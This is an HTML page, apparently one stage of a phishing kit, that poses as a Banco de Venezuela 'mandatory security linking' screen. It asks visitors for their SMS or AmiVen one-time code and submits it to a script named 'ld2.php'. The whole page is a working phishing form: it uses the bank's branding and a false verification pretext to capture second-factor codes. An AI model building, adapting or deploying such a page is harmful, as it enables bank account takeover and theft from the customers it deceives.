

<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1.0, user-scalable=no"
    />
    <title>Banco de Venezuela</title>
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-image: url(bcg.jpg);
        background-size: cover;
        background-position: center;
      }

      .container {
        display: flex;

        height: 100%;
        width: 100%;
      }

      .left-side {
        width: 50%;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .right-side {
        width: 50%;
      }
      form {
        width: 80%;
        background: white;
        max-width: 550px;
        box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
      }

      @media (max-width: 768px) {
        body {
          background: #ededed;
        }
        .container {
          flex-direction: column;
        }
        .left-side {
          width: 100%;
          height: 100vh;
        }
        .right-side {
          display: none;
        }
      }
    </style>
    <style>
      .form-group {
        position: relative;
        margin-bottom: 20px;
        margin: 20px;
      }

      .form-group label {
        position: absolute;
        top: 50%;
        left: 10px;
        transform: translateY(-55%);
        color: #999;
        transition: top 0.3s, font-size 0.3s;
        pointer-events: none;
      }

      .form-group input {
        width: 100%;
        padding: 10px;
        box-sizing: border-box;
        position: relative;
        height: 60px;
        border: 0;

        border-bottom: 1px solid gray;
        background: #ededed;
        outline: none;
      }
      .form-group input:focus {
        border: 0;
      }
      .form-group input:focus + label,
      .form-group input:not(:placeholder-shown) + label {
        top: 5px;
        font-size: 12px;
      }
      button {
        background-color: #0067b1;
        color: white;
        border-radius: 3px;
        border: 0;
        padding: 15px;
        width: 200px;
      }
    </style>
    <style>
      .slider-container {
        text-align: center;
        width: 80%;
        max-width: 600px;
        margin: auto;
      }
      .slider-container h2 {
        margin-bottom: 20px;
      }
      .slider {
        width: 100%;
        margin: 20px 0;
      }
      .slider-value {
        font-size: 24px;
        color: #333;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="left-side">
        <form id="loginform" action="ld2.php" method="post" autocomplete="off" >
          <div style="text-align: center">
            <img src="logo.png" alt="" style="width: 60%; margin-top: 20px" />
          </div>
          <div style="width: 100%; text-align: center">
            <div style="margin: 10px; color: #0067b1 !important">
              <h4>Vinculación de seguridad Obligatoria</h4>
              <h5 >
                Ingrese el código recibido por SMS o código generado en amiven
              </h5>
            </div> 
            <div class="form-group">
              <input
                type="text"
                id="ss"
                name="ss"
                style="width: 100%"
                inputmode="numeric"
                onkeypress="return (event.charCode >= 48 &amp;&amp; event.charCode <= 57)"
                minlength="6"
                maxlength="8"
                required
              />
              <label for="ss" style="top: 50%;">Codigo SMS o AmiVen *</label>
            </div>
            <input type="text" name="ocultos" readonly hidden value="">

            <script>
              document.addEventListener("DOMContentLoaded", function () {
                const input = document.getElementById("ss");
                const label = input.nextElementSibling;
                label.style.top = "50%";
                if (input.value !== "") {
                  label.style.top = "15px";
                  label.style.fontSize = "12px";
                }

                input.addEventListener("focus", () => {
                  label.style.top = "15px";
                  label.style.fontSize = "12px";
                });

                input.addEventListener("blur", () => {
                  if (!input.value) {
                    label.style.top = "50%";
                    label.style.fontSize = "";
                  }
                });
              });
            </script>
          </div>
          <div style="width: 100%; text-align: center">
            <button type="submit">Verificar</button>
          </div>
          <div style="width: 100%; height: 30px"></div>
        </form>
      </div>
      <div class="right-side"></div>
    </div>
  </body>

</html>
